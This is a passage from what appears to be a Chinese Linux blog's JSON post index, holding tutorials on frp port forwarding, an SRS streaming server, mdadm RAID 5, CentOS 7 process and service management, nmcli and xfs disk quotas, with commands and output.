服务映射到公网去访问，在做项目的时候，我们如果需要临时给其他同事进行分享，而不想直接扔到测试机，进行调试，可以使用frp 映射 http 端口到公网 ip 访问。具体步骤如下。 服务端配置文件[root@CTN-QD-247 ~]# cat /etc/frps_www.ini # frps.ini [common] bind_port = 8000 # frp 的进程端口 vhost_http_port = 8888 #访问的端口，如果80端口未被占用，可以使用80。 [web] type = http custom_domains = upyun.v5linux.com #访问的域名，需要做好 A记录解析。 auth_token = 123 #token 需要与客户端一致","text":"今天给大家分享下怎么把本机的 web 服务映射到公网去访问，在做项目的时候，我们如果需要临时给其他同事进行分享，而不想直接扔到测试机，进行调试，可以使用frp 映射 http 端口到公网 ip 访问。具体步骤如下。 服务端配置文件[root@CTN-QD-247 ~]# cat /etc/frps_www.ini # frps.ini [common] bind_port = 8000 # frp 的进程端口 vhost_http_port = 8888 #访问的端口，如果80端口未被占用，可以使用80。 [web] type = http custom_domains = upyun.v5linux.com #访问的域名，需要做好 A记录解析。 auth_token = 123 #token 需要与客户端一致 upyun.v5linux.com 需要做下解析 做 A 记录 解析到公网 IP 启动服务端nohup /usr/bin/frps -c /etc/frps_www.ini &gt;&gt; /var/log/frps_www.ini &amp;查看日志信息，我没指定重定向到文件，默认会在当前目录创建一个nohup.out的文件，查看信息 [root@CTN-QD-247 ~]# cat nohup.out 2017/05/04 17:06:26 [main.go:163] [E] Create vhost http listener error, listen tcp 0.0.0.0:8080: bind: address already in use # 提示端口被占用，换个端口或者解决端口被占用的问题 2017/05/04 17:08:49 [main.go:194] [I] Start frps success #表示启动成功客户端内网机器需要开启 http 服务，查看客户端配置文件。 [root@vm-50-156 default]# cat /etc/frpc_www.ini # frpc.ini [common] server_addr = xxxx #服务器的 ip 地址 server_port = 8000 # 与服务器一致 auth_token = 123 #与服务器一致 [web] type = http #服务类型是 web 服务 local_port = 80 #本地的 web 服务端口启动客户端[root@vm-50-156 default]# nohup /usr/bin/frpc -c /etc/frpc_www.ini &gt;&gt;/var/log/frpc_www.log &amp;开启防火墙上面配置文件中的这些个端口全部都放行 iptables -A INPUT -p tcp --dport port -j ACCEPT访问http://upyun.v5linux.com:8888 把上面的运行命令写到/etc/rc.local 文件中 并且赋予这个文件可执行文件，每次开机就自动启动了。 本文参考文档 配置，具体可以参考文档","categories":[],"tags":[{"name":"frp","slug":"frp","permalink":"https://awen.me/tags/frp/"}]},{"title":"使用开源的SRS 搭建一个直播服务","slug":"使用开源的SRS-搭建一个直播服务","date":"2017-06-14T10:59:20.000Z","updated":"2021-02-26T06:05:29.311Z","comments":true,"path":"posts/191485023.html","link":"","permalink":"https://awen.me/posts/191485023.html","excerpt":"SRS 是一个开源的，国产的直播服务。可以去官网下载：官网 环境操作系统：centos 7推流软件：obs 或 ffmpeg拉流软件：ffplay 或 vlc","text":"SRS 是一个开源的，国产的直播服务。可以去官网下载：官网 环境操作系统：centos 7推流软件：obs 或 ffmpeg拉流软件：ffplay 或 vlc 安装如果是 centos 6 可以直接下载这个进行安装 # wget -c http://ossrs.net/srs.release/releases/files/SRS-CentOS6-x86_64-2.0.239.zip # unzip SRS-CentOS6-x86_64-2.0.239.zip # cd SRS-CentOS6-x86_64-2.0.239 # chmod +x INSTALL # ./INSTALL安装在/usr/local/srs目录中，可以直接使用 /etc/init.d/srs start启动 centos 7 需要编译 [root@adsl-172-10-100-120 opt]# wget -c https://github.com/ossrs/srs/archive/v2.0-r1.tar.gz [root@adsl-172-10-100-120 opt]# tar zxvf v2.0-r1.tar.gz [root@adsl-172-10-100-120 opt]# cd srs-2.0-r1/然后进入到 trunk 目录 [root@adsl-172-10-100-120 srs-2.0-r1]# cd trunk/ [root@adsl-172-10-100-120 trunk]# ls 3rdparty auto conf configure doc etc ide modules research scripts src使用 help 可以查看编译帮助文档 [root@adsl-172-10-100-120 trunk]# ./configure --help比如我这里编译全部的模块安装到/usr/local/srs目录 [root@adsl-172-10-100-120 trunk]# ./configure --full --prefix=/usr/local/srs然后 make &amp;&amp; make install进入 /usr/local/srs [root@adsl-172-10-100-120 srs]# pwd /usr/local/srs [root@adsl-172-10-100-120 srs]# ./objs/ nginx/ srs [root@adsl-172-10-100-120 srs]# ./objs/srs -c ./conf/srs.conf [2017-05-02 17:22:56.900][trace][1949][0] XCORE-SRS/2.0.239(ZhouGuowen) [2017-05-02 17:22:56.900][trace][1949][0] config parse complete [2017-05-02 17:22:56.900][trace][1949][0] write log to file ./objs/srs.log [2017-05-02 17:22:56.900][trace][1949][0] you can: tailf ./objs/srs.log [2017-05-02 17:22:56.900][trace][1949][0] @see: https://github.com/ossrs/srs/wiki/v1_CN_SrsLog##推流 ➜ Downloads ffmpeg -i gopro.mp4 -vcodec libx264 -acodec aac -f flv rtmp://172.10.100.120/live/lol拉流然后 ffplay 播放 ➜ ~ ffplay rtmp://172.10.100.120/live/lol ffplay version 3.3 Copyright (c) 2003-2017 the FFmpeg developers built with Apple LLVM version 8.1.0 (clang-802.0.42) configuration: --prefix=/usr/local/Cellar/ffmpeg/3.3 --enable-shared --enable-pthreads --enable-gpl --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-libmp3lame --enable-libx264 --enable-libx265 --enable-libxvid --enable-opencl --disable-lzma --enable-vda libavutil 55. 58.100 / 55. 58.100 libavcodec 57. 89.100 / 57. 89.100 libavformat 57. 71.100 / 57. 71.100 libavdevice 57. 6.100 / 57. 6.100 libavfilter 6. 82.100 / 6. 82.100 libavresample 3. 5. 0 / 3. 5. 0 libswscale 4. 6.100 / 4. 6.100 libswresample 2. 7.100 / 2. 7.100 libpostproc 54. 5.100 / 54. 5.100 Input #0, flv, from &apos;rtmp://172.10.100.120/live/lol&apos;: 0B f=0/0 Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.71.100 server : SRS/2.0.239(ZhouGuowen) srs_primary : SRS/1.0release srs_authors : winlin,wenjie.zhao server_version : 2.0.239 Duration: N/A, start: 0.023000, bitrate: N/A Stream #0:0: Audio: aac (LC), 44100 Hz, stereo, fltp, 128 kb/s Stream #0:1: Video: h264 (High), yuv420p(progressive), 1280x720 [SAR 1:1 DAR 16:9], 29.97 fps, 29.97 tbr, 1k tbn, 59.94 tbc 3.96 A-V: 0.082 fd= 22 aq= 0KB vq= 0KB sq= 0B f=0/0srs 配置[root@adsl-172-10-100-120 srs]# ls conf etc objs [root@adsl-172-10-100-120 srs]# cd conf/ [root@adsl-172-10-100-120 conf]# ls bandwidth.conf edge.conf hls.conf http.hooks.callback.conf push.flv.conf transcode2hls.audio.only.conf console.conf edge.token.traverse.conf http.aac.live.conf http.mp3.live.conf push.mpegts.over.udp.conf transform.edge.conf demo.19350.conf ffmpeg.transcode.conf http.flv.live.conf http.server.conf push.rtsp.conf demo.conf forward.master.conf http.flv.live.edge1.conf http.ts.live.conf realtime.conf dvr.path.conf forward.slave.conf http.flv.live.edge2.conf ingest.conf rtmp.conf dvr.segment.conf full.conf http.heartbeat.conf mac.dev.conf security.deny.publish.conf dvr.session.conf hds.conf http.hls.conf origin.conf srs.conf默认的配置文件是 srs.conf [root@adsl-172-10-100-120 conf]# cat srs.conf # main config for srs. # @see full.conf for detail config. listen 1935; max_connections 1000; srs_log_tank file; srs_log_file ./objs/srs.log; http_api { enabled on; listen 1985; #默认端口1985 } http_server { enabled on; listen 8080; dir ./objs/nginx/html; } stats { network 0; disk sda sdb xvda xvdb; } vhost __defaultVhost__ { #虚拟主机 }如果你希望将推流的内容转换成 hls，可以参考 [root@adsl-172-10-100-120 conf]# cat hls.conf # the config for srs to delivery hls # @see https://github.com/ossrs/srs/wiki/v1_CN_SampleHLS # @see full.conf for detail config. listen 1935; max_connections 1000; daemon off; srs_log_tank console; vhost __defaultVhost__ { hls { enabled on; hls_fragment 10; hls_window 60; hls_path ./objs/nginx/html; hls_m3u8_file [app]/[stream].m3u8; hls_ts_file [app]/[stream]-[seq].ts; } }更多使用方法，参考[官方维基]（https://github.com/ossrs/srs/wiki/v3_CN_Home）","categories":[],"tags":[{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"},{"name":"srs","slug":"srs","permalink":"https://awen.me/tags/srs/"}]},{"title":"centos raid 软阵列的使用","slug":"centos-raid-软阵列的使用","date":"2017-06-14T10:57:44.000Z","updated":"2021-02-26T06:05:29.270Z","comments":true,"path":"posts/3673777329.html","link":"","permalink":"https://awen.me/posts/3673777329.html","excerpt":"创建一个 raid 设备[root@localhost /]# mknod /dev/md1 b 9 1 mknod 是命令 /dev/md1 是设备名称，设备名称必须是 md开头后面的 b 代表的是块设备 9 是主设备号 ，1是从设备号 主设备号不能更改，从设备号系统唯一","text":"创建一个 raid 设备[root@localhost /]# mknod /dev/md1 b 9 1 mknod 是命令 /dev/md1 是设备名称，设备名称必须是 md开头后面的 b 代表的是块设备 9 是主设备号 ，1是从设备号 主设备号不能更改，从设备号系统唯一 创建 raid 5 [root@localhost /]# mdadm -C /dev/md1 -l 5 -n 3 /dev/sdc5 /dev/sdc6 /dev/sdc7 mdadm: Defaulting to version 1.2 metadata mdadm: array /dev/md1 started.-C代表创建，指定块设备的路径-l 指定 raid 级别为5-n 代表硬盘数量 查看 [root@localhost /]# mdadm --detail /dev/md1 /dev/md1: Version : 1.2 Creation Time : Sat Apr 22 14:55:36 2017 Raid Level : raid5 Array Size : 1021952 (998.00 MiB 1046.48 MB) Used Dev Size : 510976 (499.00 MiB 523.24 MB) Raid Devices : 3 Total Devices : 3 Persistence : Superblock is persistent Update Time : Sat Apr 22 14:55:39 2017 State : clean Active Devices : 3 Working Devices : 3 Failed Devices : 0 Spare Devices : 0 Layout : left-symmetric Chunk Size : 512K Name : localhost.localdomain:1 (local to host localhost.localdomain) UUID : 2a5294bf:dd845f28:c6c3fa2e:ed6d5d20 Events : 18 Number Major Minor RaidDevice State 0 8 37 0 active sync /dev/sdc5 1 8 38 1 active sync /dev/sdc6 3 8 39 2 active sync /dev/sdc7格式化挂载[root@localhost /]# mkfs -t xfs /dev/md1 meta-data=/dev/md1 isize=512 agcount=8, agsize=31872 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=254976, imaxpct=25 = sunit=128 swidth=256 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=624, version=2 = sectsz=512 sunit=8 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 [root@localhost /]# mount /dev/md1 /mnt/data模拟失效[root@localhost data]# mdadm /dev/md1 -f /dev/sdc7 mdadm: set /dev/sdc7 faulty in /dev/md1查看 [root@localhost data]# mdadm --detail /dev/md1 /dev/md1: Version : 1.2 Creation Time : Sat Apr 22 14:55:36 2017 Raid Level : raid5 Array Size : 1021952 (998.00 MiB 1046.48 MB) Used Dev Size : 510976 (499.00 MiB 523.24 MB) Raid Devices : 3 Total Devices : 3 Persistence : Superblock is persistent Update Time : Sat Apr 22 15:04:02 2017 State : clean, degraded Active Devices : 2 Working Devices : 2 Failed Devices : 1 Spare Devices : 0 Layout : left-symmetric Chunk Size : 512K Name : localhost.localdomain:1 (local to host localhost.localdomain) UUID : 2a5294bf:dd845f28:c6c3fa2e:ed6d5d20 Events : 22 Number Major Minor RaidDevice State 0 8 37 0 active sync /dev/sdc5 1 8 38 1 active sync /dev/sdc6 - 0 0 2 removed 3 8 39 - faulty /dev/sdc7移除[root@localhost data]# mdadm /dev/md1 --remove /dev/sdc7 mdadm: hot removed /dev/sdc7 from /dev/md1 [root@localhost data]# mdadm --detail /dev/md1 /dev/md1: Version : 1.2 Creation Time : Sat Apr 22 14:55:36 2017 Raid Level : raid5 Array Size : 1021952 (998.00 MiB 1046.48 MB) Used Dev Size : 510976 (499.00 MiB 523.24 MB) Raid Devices : 3 Total Devices : 2 Persistence : Superblock is persistent Update Time : Sat Apr 22 15:05:02 2017 State : clean, degraded Active Devices : 2 Working Devices : 2 Failed Devices : 0 Spare Devices : 0 Layout : left-symmetric Chunk Size : 512K Name : localhost.localdomain:1 (local to host localhost.localdomain) UUID : 2a5294bf:dd845f28:c6c3fa2e:ed6d5d20 Events : 27 Number Major Minor RaidDevice State 0 8 37 0 active sync /dev/sdc5 1 8 38 1 active sync /dev/sdc6 - 0 0 2 removed添加[root@localhost data]# mdadm /dev/md1 --add /dev/sdc7 mdadm: added /dev/sdc7 [root@localhost data]# mdadm --detail /dev/md1 /dev/md1: Version : 1.2 Creation Time : Sat Apr 22 14:55:36 2017 Raid Level : raid5 Array Size : 1021952 (998.00 MiB 1046.48 MB) Used Dev Size : 510976 (499.00 MiB 523.24 MB) Raid Devices : 3 Total Devices : 3 Persistence : Superblock is persistent Update Time : Sat Apr 22 15:05:52 2017 State : clean Active Devices : 3 Working Devices : 3 Failed Devices : 0 Spare Devices : 0 Layout : left-symmetric Chunk Size : 512K Name : localhost.localdomain:1 (local to host localhost.localdomain) UUID : 2a5294bf:dd845f28:c6c3fa2e:ed6d5d20 Events : 46 Number Major Minor RaidDevice State 0 8 37 0 active sync /dev/sdc5 1 8 38 1 active sync /dev/sdc6 3 8 39 2 active sync /dev/sdc7","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"centos 7 进程管理","slug":"centos-7-进程管理","date":"2017-06-14T10:56:18.000Z","updated":"2021-02-26T06:05:29.270Z","comments":true,"path":"posts/672924753.html","link":"","permalink":"https://awen.me/posts/672924753.html","excerpt":"centos7 使用 systemd 管理进行，systemd 是父进程。 查看进程的命令 ps pstree top","text":"centos7 使用 systemd 管理进行，systemd 是父进程。 查看进程的命令 ps pstree top ##ps [root@localhost yum.repos.d]# ps PID TTY TIME CMD 13463 pts/1 00:00:00 su 13469 pts/1 00:00:00 bash 13729 pts/1 00:00:00 ps使用 [root@localhost yum.repos.d]# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.3 128092 6772 ? Ss 09:22 0:06 /usr/lib/systemd/systemd --switched-root --system root 2 0.0 0.0 0 0 ? S 09:22 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S 09:22 0:00 [ksoftirqd/0] root 7 0.0 0.0 0 0 ? S 09:22 0:00 [migration/0] root 8 0.0 0.0 0 0 ? S 09:22 0:00 [rcu_bh] root 9 0.0 0.0 0 0 ? R 09:22 0:00 [rcu_sched] root 10 0.0 0.0 0 0 ? S 09:22 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S 09:22 0:00 [watchdog/1] root 12 0.0 0.0 0 0 ? S 09:22 0:00 [migration/1] USER 运行进程的用户 PID 进程号 %CPU cpu 使用率 %MEM 内存使用率 VSZ 虚拟内存使用率 RSS 固定使用的内存 TTY 终端信息，该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。 STAT 进程状态 START 进程开始时间 TIME 使用掉的 CPU 时间 COMMAND 指向的程序路径 进程状态运行 -R 正在运行或运行队列中等待中断 -S 休眠中，受阻，在等等某个条件的形成或接受到信息不可中断 -D僵死 -Z停止 -T 进程优先级&lt; 优先级较高的进程N 优先级较低的进程L 有些页被锁住内存l 多进程的s 进程的领导者，在它之下有子进程 位于后台的进程组 ##pstree命令 以进程树的方式查看 可以看到 systemd 是父进程，所有进程都位于其之下。 [root@localhost yum.repos.d]# pstree systemd─┬─ModemManager───2*[{ModemManager}] ├─NetworkManager───2*[{NetworkManager}] ├─2*[abrt-watch-log] ├─abrtd ├─accounts-daemon───2*[{accounts-daemon}] ├─alsactl ├─at-spi-bus-laun─┬─dbus-daemon───{dbus-daemon} │ └─3*[{at-spi-bus-laun}] ├─at-spi2-registr───2*[{at-spi2-registr}] ├─atd ├─auditd─┬─audispd─┬─sedispatch │ │ └─{audispd} │ └─{auditd} ├─avahi-daemon───avahi-daemon ├─bluetoothd ├─caribou───2*[{caribou}] ├─chronyd ├─colord───2*[{colord}] ├─crond ├─cupsd ├─2*[dbus-daemon───{dbus-daemon}] ├─dbus-launch ├─dnsmasq───dnsmasq ├─evolution-calen───5*[{evolution-calen}] ├─evolution-sourc───2*[{evolution-sourc}] ├─gdm─┬─Xorg───2*[{Xorg}] │ ├─gdm-session-wor─┬─gnome-session─┬─abrt-applet───2*[{abrt-applet}] │ │ │ ├─gnome-settings-───4*[{gnome-settings-}] │ │ │ ├─gnome-shell─┬─ibus-daemon─┬─ibus-dconf───3*[{ibus-dconf}] │ │ │ │ │ ├─ibus-engine-sim───2*[{ibus-engine-si+ │ │ │ │ │ └─2*[{ibus-daemon}] │ │ │ │ └─10*[{gnome-shell}] │ │ │ ├─gnome-software───3*[{gnome-software}] │ │ │ ├─nautilus───3*[{nautilus}] │ │ │ ├─seapplet │ │ │ ├─ssh-agent │ │ │ ├─tracker-extract───13*[{tracker-extract}] │ │ │ ├─tracker-miner-a───2*[{tracker-miner-a}] │ │ │ ├─tracker-miner-f───3*[{tracker-miner-f}] │ │ │ ├─tracker-miner-u───2*[{tracker-miner-u}] │ │ │ └─3*[{gnome-session}] │ │ └─2*[{gdm-session-wor}] │ └─3*[{gdm}] ├─gnome-keyring-d───4*[{gnome-keyring-d}] ├─gnome-shell-cal───5*[{gnome-shell-cal}] ├─goa-daemon───3*[{goa-daemon}] ├─goa-identity-se───3*[{goa-identity-se}] ├─gsd-printer───2*[{gsd-printer}] ├─gssproxy───5*[{gssproxy}] ├─gvfs-afc-volume───3*[{gvfs-afc-volume}] ├─gvfs-goa-volume───2*[{gvfs-goa-volume}] ├─gvfs-gphoto2-vo───2*[{gvfs-gphoto2-vo}] ├─gvfs-mtp-volume───2*[{gvfs-mtp-volume}] ├─gvfs-udisks2-vo───2*[{gvfs-udisks2-vo}] ├─gvfsd───2*[{gvfsd}] ├─gvfsd-fuse───5*[{gvfsd-fuse}] ├─gvfsd-trash───2*[{gvfsd-trash}] ├─ibus-x11───2*[{ibus-x11}] ├─irqbalance ├─ksmtuned───sleep ├─libvirtd───15*[{libvirtd}] ├─lsmd ├─lvmetad ├─master─┬─pickup │ └─qmgr ├─mcelog ├─mission-control───3*[{mission-control}] ├─nginx───nginx ├─packagekitd───2*[{packagekitd}] ├─polkitd───5*[{polkitd}] ├─pulseaudio───2*[{pulseaudio}] ├─rngd ├─rsyslogd───2*[{rsyslogd}] ├─rtkit-daemon───2*[{rtkit-daemon}] ├─smartd ├─sshd─┬─sshd───sshd───bash───su───bash │ └─sshd───sshd───bash───su───bash───pstree ├─systemd-journal ├─systemd-logind ├─systemd-udevd ├─tracker-store───7*[{tracker-store}] ├─tuned───4*[{tuned}] ├─udisksd───4*[{udisksd}] ├─upowerd───2*[{upowerd}] ├─vmtoolsd───{vmtoolsd} ├─vmtoolsd ├─vsftpd └─wpa_supplicant查看 systemd，其 进程号为1，父进程号不会改变。 [root@localhost yum.repos.d]# ps aux | grep systemd root 1 0.0 0.3 128092 6772 ? Ss 09:22 0:06 /usr/lib/systemd/systemd --switched-root --system --deserialize 21 root 493 0.0 0.2 36944 3880 ? Ss 09:22 0:00 /usr/lib/systemd/systemd-journald root 519 0.0 0.2 46912 5160 ? Ss 09:22 0:00 /usr/lib/systemd/systemd-udevd dbus 704 0.0 0.1 36456 3368 ? Ssl 09:22 0:01 /bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation root 733 0.0 0.0 24260 1768 ? Ss 09:22 0:00 /usr/lib/systemd/systemd-logind root 14259 0.0 0.0 112652 964 pts/1 S+ 12:05 0:00 grep --color=auto systemd结束进程[root@localhost yum.repos.d]# ps aux | grep firefox fwj 13977 20.8 12.5 2130344 231868 ? Sl 11:56 0:10 /usr/lib64/firefox/firefox root 14116 0.0 0.0 112648 964 pts/1 R+ 11:57 0:00 grep --color=auto firefox [root@localhost yum.repos.d]# kill -9 13977 [root@localhost yum.repos.d]# ps aux | grep firefox root 14122 0.0 0.0 112648 964 pts/1 S+ 11:58 0:00 grep --color=auto firefox后台运行command &amp; 后台运行 ctrl+z 后台运行ctrl +c 结束进程sleep 休眠 jobs 查看后台进程fg[%作业号]bg[%作业号] [root@localhost opt]# ping awen.me &gt; test &amp; [1] 15101 [root@localhost opt]# jobs [1]+ Running ping awen.me &gt; test &amp; [root@localhost opt]# fg 1 ping awen.me &gt; test控制进程[root@localhost opt]# service vsftpd status Redirecting to /bin/systemctl status vsftpd.service ● vsftpd.service - Vsftpd ftp daemon Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; enabled; vendor preset: disabled) Active: active (running) since Sun 2017-04-23 11:13:24 CST; 2h 25min ago Main PID: 12823 (vsftpd) CGroup: /system.slice/vsftpd.service └─12823 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf Apr 23 11:13:24 localhost.localdomain systemd[1]: Starting Vsftpd ftp daemon... Apr 23 11:13:24 localhost.localdomain systemd[1]: Started Vsftpd ftp daemon.RHEL 7 使用 systemctl 控制服务 systemctl start|stop|restart sshd案例 [root@localhost opt]# systemctl stop vsftpd.service [root@localhost opt]# systemctl status vsftpd.service ● vsftpd.service - Vsftpd ftp daemon Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; enabled; vendor preset: disabled) Active: inactive (dead) since Sun 2017-04-23 13:43:00 CST; 6s ago Main PID: 12823 (code=killed, signal=TERM) Apr 23 11:13:24 localhost.localdomain systemd[1]: Starting Vsftpd ftp daemon... Apr 23 11:13:24 localhost.localdomain systemd[1]: Started Vsftpd ftp daemon. Apr 23 13:43:00 localhost.localdomain systemd[1]: Stopping Vsftpd ftp daemon... Apr 23 13:43:00 localhost.localdomain systemd[1]: Stopped Vsftpd ftp daemon.查看服务是否开机启动 [root@localhost opt]# systemctl is-enabled sshd enabled start 开启 stop 停止 reload 重新加载 restart 重启 status 查看状态 eanble 开机启动 disable 开机不启动 reenable 重新设置开机启动 is-enabled 是否开机启动 unmask 不禁用服务 mask 禁用服务 is-active 是否启动 is-failed 是否失败 查看服务文件 [root@localhost opt]# systemctl list-unit-files | grep sshd anaconda-sshd.service static sshd-keygen.service static sshd.service enabled sshd@.service static sshd.socket disabled","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux nmcli 使用","slug":"Linux-nmcli-使用","date":"2017-06-14T10:54:42.000Z","updated":"2021-02-26T06:05:29.253Z","comments":true,"path":"posts/248491651.html","link":"","permalink":"https://awen.me/posts/248491651.html","excerpt":"CentOS 7下网卡命名规则：CentOS 7 开始对于网卡的编号则有另一套规则， 网卡的界面代号现在与网卡的来源有关，基本上的网卡名称会是这样分类的： eno1 ： 代表由主板 BIOS 内置的网卡 ens1 ： 代表由主板 BIOS 内置的 PCI-E 界面的网卡 enp2s0 ： 代表 PCI-E 界面的独立网卡， 可能有多个插孔， 因此会有 s0, s1… 的编号eth0 ： 如果上述的名称都不适用， 就回到原本的默认网卡编号CentOS 7 也希望我们不要手动修改配置文件， 直接使用所谓的 nmcli 这个指令来设置网络参数即可","text":"CentOS 7下网卡命名规则：CentOS 7 开始对于网卡的编号则有另一套规则， 网卡的界面代号现在与网卡的来源有关，基本上的网卡名称会是这样分类的： eno1 ： 代表由主板 BIOS 内置的网卡 ens1 ： 代表由主板 BIOS 内置的 PCI-E 界面的网卡 enp2s0 ： 代表 PCI-E 界面的独立网卡， 可能有多个插孔， 因此会有 s0, s1… 的编号eth0 ： 如果上述的名称都不适用， 就回到原本的默认网卡编号CentOS 7 也希望我们不要手动修改配置文件， 直接使用所谓的 nmcli 这个指令来设置网络参数即可 显示NetworkManager网络总体状态 [root@adsl-172-10-100-128 network-scripts]# nmcli general status STATE CONNECTIVITY WIFI-HW WIFI WWAN-HW WWAN connected full enabled enabled enabled enabled 显示设备及其状态 [root@adsl-172-10-100-128 network-scripts]# nmcli device status DEVICE TYPE STATE CONNECTION virbr0 bridge connected virbr0 ens33 ethernet connected ens33 ens37 ethernet connected ens37 lo loopback unmanaged -- virbr0-nic tun unmanaged --显示所有链接 [root@adsl-172-10-100-128 network-scripts]# nmcli connection show NAME UUID TYPE DEVICE ens33 31999985-233f-46ff-98fa-d9d7b566f3bc 802-3-ethernet ens33 ens37 001e8f90-b6bf-4caf-8b5d-9d83adc6c833 802-3-ethernet ens37 virbr0 ba69e3ca-64e5-4186-a985-77cda6eddbc7 bridge virbr0也可以简写 [root@adsl-172-10-100-128 network-scripts]# nmcli con show NAME UUID TYPE DEVICE ens33 31999985-233f-46ff-98fa-d9d7b566f3bc 802-3-ethernet ens33 ens37 001e8f90-b6bf-4caf-8b5d-9d83adc6c833 802-3-ethernet ens37 virbr0 ba69e3ca-64e5-4186-a985-77cda6eddbc7 bridge virbr0显示接口详细信息 [root@adsl-172-10-100-120 ~]# nmcli dev sh bond0 GENERAL.DEVICE: bond0 GENERAL.TYPE: bond GENERAL.HWADDR: 00:0C:29:46:29:8F GENERAL.MTU: 1500 GENERAL.STATE: 100 (connected) GENERAL.CONNECTION: bond-bond0 GENERAL.CON-PATH: /org/freedesktop/NetworkManager/ActiveConnection/0 IP4.ADDRESS[1]: 172.10.100.120/24 IP4.GATEWAY: 172.10.100.2 IP4.DNS[1]: 114.114.114.114 IP4.DNS[2]: 223.5.5.5 IP6.ADDRESS[1]: fe80::265a:8fa0:f4f2:28fe/64 IP6.GATEWAY: 如果一时想不起来某个参数可以这样 [root@adsl-172-10-100-120 ~]# nmcli con help Usage: nmcli connection { COMMAND | help } COMMAND := { show | up | down | add | modify | clone | edit | delete | monitor | reload | load | import | export } show [--active] [--order &lt;order spec&gt;] show [--active] [id | uuid | path | apath] &lt;ID&gt; ... up [[id | uuid | path] &lt;ID&gt;] [ifname &lt;ifname&gt;] [ap &lt;BSSID&gt;] [passwd-file &lt;file with passwords&gt;] down [id | uuid | path | apath] &lt;ID&gt; ... add COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+] modify [--temporary] [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+ clone [--temporary] [id | uuid | path ] &lt;ID&gt; &lt;new name&gt; edit [id | uuid | path] &lt;ID&gt; edit [type &lt;new_con_type&gt;] [con-name &lt;new_con_name&gt;] delete [id | uuid | path] &lt;ID&gt; monitor [id | uuid | path] &lt;ID&gt; ... reload load &lt;filename&gt; [ &lt;filename&gt;... ] import [--temporary] type &lt;type&gt; file &lt;file to import&gt; export [id | uuid | path] &lt;ID&gt; [&lt;output file&gt;]","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 设置 xfs 格式的磁盘配额","slug":"Linux-设置-xfs-格式的磁盘配额","date":"2017-06-14T10:51:39.000Z","updated":"2021-02-26T06:05:29.257Z","comments":true,"path":"posts/2494641305.html","link":"","permalink":"https://awen.me/posts/2494641305.html","excerpt":"格式化磁盘1.创建一个逻辑卷并格式化为 xfs格式，然后查看 uuid [root@localhost ~]# blkid /dev/myvg/xfs /dev/myvg/xfs: UUID=&quot;e7710906-95db-4468-9527-73c25a7e944f&quot; TYPE=&quot;xfs&quot;","text":"格式化磁盘1.创建一个逻辑卷并格式化为 xfs格式，然后查看 uuid [root@localhost ~]# blkid /dev/myvg/xfs /dev/myvg/xfs: UUID=&quot;e7710906-95db-4468-9527-73c25a7e944f&quot; TYPE=&quot;xfs&quot; 2.编辑/etc/fstab 文件，添加 UUID=e7710906-95db-4468-9527-73c25a7e944f /mnt/xfs xfs defaults,usrquota,grpquota 0 0 3.查看并挂载 创建目录 [root@localhost ~]# mkdir -p /mnt/xfs [root@localhost ~]# mount -a查看是否启动配额 [root@localhost ~]# mount | tail -1 /dev/mapper/myvg-xfs on /mnt/xfs type xfs (rw,relatime,seclabel,attr2,inode64,usrquota,grpquota) 4.创建配额 设置块的软限制为12m 硬限制为20 文件数软限制为3 硬限制为5 [root@localhost ~]# xfs_quota -x -c &apos;limit bsoft=12m bhard=20m isoft=3 ihard=5 zhangsan&apos; /mnt/xfs/5.查看配额 [root@localhost ~]# xfs_quota -x -c report /mnt/xfs/ User quota on /mnt/xfs (/dev/mapper/myvg-xfs) Blocks User ID Used Soft Hard Warn/Grace ---------- -------------------------------------------------- root 0 0 0 00 [--------] zhangsan 51200 12288 20480 00 [--none--] Group quota on /mnt/xfs (/dev/mapper/myvg-xfs) Blocks Group ID Used Soft Hard Warn/Grace ---------- -------------------------------------------------- root 0 0 0 00 [--------] zhangsan 51200 0 0 00 [--------]6.赋予目录权限 [root@localhost ~]# setfacl -m user:zhangsan:rwx /mnt/xfs/ [root@localhost ~]# setfacl -m group:zhangsan:rwx /mnt/xfs/7.切换到 zhangsan 测试写入文件数量 [zhangsan@localhost xfs]$ pwd /mnt/xfs [zhangsan@localhost xfs]$ touch a{1..10} touch: cannot touch ‘a6’: Disk quota exceeded touch: cannot touch ‘a7’: Disk quota exceeded touch: cannot touch ‘a8’: Disk quota exceeded touch: cannot touch ‘a9’: Disk quota exceeded touch: cannot touch ‘a10’: Disk quota exceeded [zhangsan@localhost xfs]$ ls a1 a2 a3 a4 a5发现最多只能写入5个文件 8.测试块 由于限制了文件数，所以，这里先删除一个文件 [zhangsan@localhost xfs]$ ls a1 a2 a3 a4 a5 [zhangsan@localhost xfs]$ rm -rf a5写入12m 文件，已经达到块的软现在，没有报错，成功写入 文件 [zhangsan@localhost xfs]$ dd if=/dev/zero of=my.iso bs=1M count=12 12+0 records in 12+0 records out 12582912 bytes (13 MB) copied, 0.00998071 s, 1.3 GB/s再次写入12m 文件，命名为 